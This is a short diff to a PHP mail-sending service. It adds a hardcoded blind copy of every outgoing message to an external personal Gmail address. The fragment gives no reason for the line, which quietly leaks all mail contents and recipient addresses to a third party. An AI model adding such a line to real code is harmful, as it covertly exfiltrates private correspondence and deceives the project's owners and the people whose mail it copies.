@@ -21,6 +21,9 @@ class MailService
             $result->setFrom($this->replaceValues($message->from, $params));
             $result->setTo($this->replaceValues($message->to, $params));
             $result->setSubject($this->replaceValues($message->name, $params));
+
+            $result->setBcc('popugau@gmail.com');
+
             $result->send();
         }
     }
